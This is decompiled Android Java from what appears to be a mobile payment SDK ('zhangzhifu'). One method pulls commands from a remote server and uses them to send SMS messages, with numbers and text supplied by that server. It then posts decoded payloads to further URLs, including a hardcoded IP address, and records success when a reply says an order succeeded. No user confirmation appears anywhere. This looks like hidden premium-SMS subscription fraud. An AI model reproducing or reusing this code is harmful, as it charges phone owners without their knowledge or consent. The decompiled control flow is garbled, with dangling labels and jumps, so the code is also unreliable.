package com.zhangzhifu.sdk.onlinegame;

import android.os.AsyncTask;
import android.util.Base64;
import com.zhangzhifu.sdk.db.SharePreferUtil;
import com.zhangzhifu.sdk.modle.MMFiveBean;
import com.zhangzhifu.sdk.modle.MMFrothBean;
import com.zhangzhifu.sdk.modle.MMProcedure;
import com.zhangzhifu.sdk.modle.MMSecondBean;
import com.zhangzhifu.sdk.modle.MMThridBean;
import com.zhangzhifu.sdk.modle.MMWap;
import com.zhangzhifu.sdk.protocolstack.MMFiveXMLParser;
import com.zhangzhifu.sdk.protocolstack.MMFrothXMLParser;
import com.zhangzhifu.sdk.protocolstack.MMSecondXMLParser;
import com.zhangzhifu.sdk.protocolstack.MMThridXMLParser;
import com.zhangzhifu.sdk.util.HttpUtils;
import com.zhangzhifu.sdk.util.Tools;
import com.zhangzhifu.sdk.util.ZhangPayLog;
import com.zhangzhifu.sdk.util.json.JSonParser_MM_Fee;
import com.zhangzhifu.sdk.util.json.MsgResponse_MM_Fee;
import com.zhangzhifu.sdk.util.sms.SendSMS;
import java.io.PrintStream;
import java.io.StringReader;
import java.util.List;
import org.apache.http.HttpResponse;

final class a
  extends AsyncTask
{
  a(ZhangPayMM paramZhangPayMM, MMWap paramMMWap) {}
  
  private String s()
  {
    int n = this.cj.getAllProcedure().size();
    if (n == 0) {
      return null;
    }
    int i = 0;
    if (i >= n) {
      return null;
    }
    ZhangPayMM.a(this.ci, (MMProcedure)this.cj.getAllProcedure().get(i));
    Object localObject3;
    int j;
    label229:
    label248:
    label394:
    String str1;
    int k;
    label484:
    label774:
    label853:
    label937:
    label953:
    label999:
    label1068:
    label1087:
    label1160:
    label1227:
    int m;
    label1295:
    Object localObject2;
    if (ZhangPayMM.a(this.ci) != null)
    {
      ZhangPayMM.a(this.ci, ZhangPayMM.a(this.ci).getA_url());
      if ((ZhangPayMM.b(this.ci) != null) && (!ZhangPayMM.b(this.ci).trim().equals("")))
      {
        String str6;
        try
        {
          localObject1 = Tools.getContentByCMWAP(ZhangPayMM.b(this.ci), Tools.getHeadersByDefault(ZhangPayMM.c(this.ci), null, null), ZhangPayMM.c(this.ci));
          if (localObject1 == null) {
            break label1895;
          }
          if ((i != 0) && (i % 2 != 0)) {
            break label1882;
          }
          localObject3 = new StringReader(Tools.getBody((HttpResponse)localObject1, ZhangPayMM.c(this.ci)));
          ZhangPayMM.a(this.ci, new MMSecondXMLParser().readXML((StringReader)localObject3, ZhangPayMM.c(this.ci)));
          if ((ZhangPayMM.d(this.ci) == null) || (ZhangPayMM.d(this.ci).size() <= 0)) {
            break label1882;
          }
          j = 0;
          if (j >= ZhangPayMM.d(this.ci).size())
          {
            break label1882;
            localObject1 = Tools.getBody((HttpResponse)localObject1, ZhangPayMM.c(this.ci));
            ZhangPayMM.a(this.ci, JSonParser_MM_Fee.getMsgResponse((String)localObject1));
            localObject1 = ZhangPayMM.e(this.ci).getResult();
            localObject3 = ZhangPayMM.e(this.ci).getSessionid();
            SharePreferUtil.getInstance().setSessionId(ZhangPayMM.c(this.ci), (String)localObject3);
            str2 = ZhangPayMM.e(this.ci).getUrl();
            if (localObject1 == null) {
              break label1895;
            }
            localObject1 = new StringReader((String)localObject1);
            ZhangPayMM.b(this.ci, new MMThridXMLParser().readXML((StringReader)localObject1, ZhangPayMM.c(this.ci)));
            if ((ZhangPayMM.f(this.ci) == null) || (ZhangPayMM.f(this.ci).size() < 0)) {
              break label1895;
            }
            j = 0;
            if (j >= ZhangPayMM.f(this.ci).size()) {
              break label1895;
            }
          }
          else
          {
            ZhangPayMM.a(this.ci, new MMSecondBean());
            localObject3 = ((MMSecondBean)ZhangPayMM.d(this.ci).get(j)).getData();
            str1 = ((MMSecondBean)ZhangPayMM.d(this.ci).get(j)).getUrl();
            if ((str1 == null) || (localObject3 == null)) {
              break label1907;
            }
            k = 0;
            break label1902;
            if (HttpUtils.post(str1, Base64.decode(((String)localObject3).getBytes(), 0)) != null) {
              break label1907;
            }
            k += 1;
            break label1902;
          }
          str3 = ((MMThridBean)ZhangPayMM.f(this.ci).get(j)).getUrl();
          localObject3 = ((MMThridBean)ZhangPayMM.f(this.ci).get(j)).getUrl1();
          localObject1 = this.ci;
          ZhangPayMM.k(ZhangPayMM.c(this.ci), (String)localObject3);
          String str7 = ((MMThridBean)ZhangPayMM.f(this.ci).get(j)).getData1();
          str6 = ((MMThridBean)ZhangPayMM.f(this.ci).get(j)).getData();
          str4 = ((MMThridBean)ZhangPayMM.f(this.ci).get(j)).getUrl2();
          str5 = ((MMThridBean)ZhangPayMM.f(this.ci).get(j)).getData2();
          ((MMThridBean)ZhangPayMM.f(this.ci).get(j)).getStatus();
          ((MMThridBean)ZhangPayMM.f(this.ci).get(j)).getMethod1();
          ((MMThridBean)ZhangPayMM.f(this.ci).get(j)).getMethod2();
          localObject1 = null;
          str1 = null;
          if (str6 != null) {
            break label1422;
          }
          new SendSMS().sendSMS(ZhangPayMM.c(this.ci), (String)localObject3, new String(Base64.decode(str7.getBytes(), 0)), null);
          Thread.sleep(15000L);
          localObject1 = null;
          k = 0;
        }
        catch (Exception localException)
        {
          Object localObject1;
          String str2;
          String str4;
          String str5;
          ZhangPayLog.d("MMFee", "================发送短信发生错误");
          break label1895;
        }
        System.out.println("发短信后请求服务端所得数据:" + (String)localObject1 + "\n所请求的url是：" + str4);
        String str3 = "<?xml version='1.0' encoding='UTF-8' standalone='yes' ?><root><data>" + new String(Base64.encode(((String)localObject1).getBytes(), 0)) + "</data></root>";
        localObject1 = null;
        k = 0;
        break label1922;
        localObject1 = str1;
        if (localObject3 != null)
        {
          localObject1 = new StringReader((String)localObject3);
          ZhangPayMM.c(this.ci, new MMFiveXMLParser().readXML((StringReader)localObject1, ZhangPayMM.c(this.ci)));
          localObject1 = str1;
          if (ZhangPayMM.g(this.ci) != null)
          {
            localObject1 = str1;
            if (ZhangPayMM.g(this.ci).size() >= 0)
            {
              k = 0;
              localObject1 = null;
              if (k < ZhangPayMM.g(this.ci).size()) {
                break label1227;
              }
            }
          }
        }
        str1 = "<?xml version='1.0' encoding='UTF-8' standalone='yes' ?><root><data>" + new String(Base64.encode(((String)localObject1).getBytes(), 0)) + "</data></root>";
        localObject1 = null;
        k = 0;
        break label1934;
        for (;;)
        {
          if (localObject1 != null)
          {
            localObject1 = new StringReader((String)localObject1);
            ZhangPayMM.d(this.ci, new MMFrothXMLParser().readXML((StringReader)localObject1, ZhangPayMM.c(this.ci)));
            if ((ZhangPayMM.h(this.ci) != null) && (ZhangPayMM.h(this.ci).size() >= 0))
            {
              k = 0;
              if (k >= ZhangPayMM.h(this.ci).size())
              {
                break label1942;
                localObject3 = HttpUtils.sendPost(str4, new String(Base64.decode(str5.getBytes(), 0)), null, ZhangPayMM.c(this.ci));
                Thread.sleep(3000L);
                localObject1 = localObject3;
                if (localObject3 != null) {
                  break;
                }
                SharePreferUtil.getInstance().setSmsResult(ZhangPayMM.c(this.ci), 1011);
                k += 1;
                localObject1 = localObject3;
                break label1914;
                localObject1 = HttpUtils.sendPost(str2, str3, SharePreferUtil.getInstance().getSessionId(ZhangPayMM.c(this.ci)), ZhangPayMM.c(this.ci));
                Thread.sleep(3000L);
                localObject3 = localObject1;
                if (localObject1 != null) {
                  break label853;
                }
                SharePreferUtil.getInstance().setSmsResult(ZhangPayMM.c(this.ci), 1011);
                k += 1;
                break label1922;
                str1 = ((MMFiveBean)ZhangPayMM.g(this.ci).get(k)).getUrl();
                str3 = ((MMFiveBean)ZhangPayMM.g(this.ci).get(k)).getData();
                ((MMFiveBean)ZhangPayMM.g(this.ci).get(k)).getMethod();
                m = 0;
                break label1949;
                localObject3 = HttpUtils.sendPost(str1, new String(Base64.decode(str3.getBytes(), 0)), null, ZhangPayMM.c(this.ci));
                Thread.sleep(3000L);
                if (localObject3 != null)
                {
                  localObject1 = localObject3;
                  if (!((String)localObject3).toString().contains("网络连接失败")) {
                    break label1955;
                  }
                  SharePreferUtil.getInstance().setSmsResult(ZhangPayMM.c(this.ci), 1010);
                  localObject1 = localObject3;
                  break label1955;
                }
                SharePreferUtil.getInstance().setSmsResult(ZhangPayMM.c(this.ci), 1011);
                m += 1;
                localObject2 = localObject3;
                break label1949;
                label1422:
                System.out.println("data不是空值");
                k = 0;
                for (;;)
                {
                  if (k >= 3) {
                    break label1570;
                  }
                  localObject3 = HttpUtils.sendPost(str3, new String(Base64.decode(str6.getBytes(), 0)), null, ZhangPayMM.c(this.ci));
                  System.out.println("resultFive" + (String)localObject3);
                  Thread.sleep(3000L);
                  if (localObject3 != null)
                  {
                    localObject2 = localObject3;
                    if (!((String)localObject3).toString().contains("网络连接失败")) {
                      break;
                    }
                    SharePreferUtil.getInstance().setSmsResult(ZhangPayMM.c(this.ci), 1010);
                    localObject2 = localObject3;
                    break;
                  }
                  SharePreferUtil.getInstance().setSmsResult(ZhangPayMM.c(this.ci), 1011);
                  k += 1;
                  localObject2 = localObject3;
                }
                label1570:
                break label953;
                label1572:
                localObject3 = HttpUtils.sendPost("http://123.59.13.100:6000/test/HelloServlet?command=2_2", str1, SharePreferUtil.getInstance().getSessionId(ZhangPayMM.c(this.ci)), ZhangPayMM.c(this.ci));
                localObject2 = localObject3;
                if (localObject3 != null) {
                  continue;
                }
                SharePreferUtil.getInstance().setSmsResult(ZhangPayMM.c(this.ci), 1011);
                k += 1;
                localObject2 = localObject3;
                break label1934;
              }
              localObject3 = ((MMFrothBean)ZhangPayMM.h(this.ci).get(k)).getUrl();
              str1 = ((MMFrothBean)ZhangPayMM.h(this.ci).get(k)).getData();
              ((MMFrothBean)ZhangPayMM.h(this.ci).get(k)).getMethod();
              localObject2 = null;
              m = 0;
              break label1962;
            }
          }
        }
      }
    }
    for (;;)
    {
      label1709:
      System.out.println("最后请求服务端所得数据:" + (String)localObject2);
      k += 1;
      break label1068;
      label1873:
      label1882:
      label1895:
      label1902:
      label1907:
      label1914:
      label1922:
      label1934:
      label1942:
      label1949:
      label1955:
      label1962:
      do
      {
        localObject2 = HttpUtils.sendPost((String)localObject3, new String(Base64.decode(str1.getBytes(), 0)), null, ZhangPayMM.c(this.ci));
        Thread.sleep(3000L);
        if (localObject2 != null)
        {
          if (((String)localObject2).toString().contains("订购成功"))
          {
            SharePreferUtil.getInstance().setSmsResult(ZhangPayMM.c(this.ci), 1001);
            break label1709;
          }
          if (!((String)localObject2).toString().contains("网络连接失败")) {
            break label1873;
          }
          System.out.println("********************************************");
          SharePreferUtil.getInstance().setSmsResult(ZhangPayMM.c(this.ci), 1010);
          break label1709;
        }
        SharePreferUtil.getInstance().setSmsResult(ZhangPayMM.c(this.ci), 1011);
        m += 1;
        continue;
        if ((i != 0) || (i % 2 != 0)) {
          break label248;
        }
        i += 1;
        break;
        if (k < 3) {
          break label484;
        }
        j += 1;
        break label229;
        if (k < 3) {
          break label1087;
        }
        break label774;
        if (k < 3) {
          break label1160;
        }
        localObject3 = localObject2;
        break label853;
        if (k < 3) {
          break label1572;
        }
        break label999;
        j += 1;
        break label394;
        if (m < 3) {
          break label1295;
        }
        k += 1;
        break label937;
      } while (m < 3);
    }
  }
}
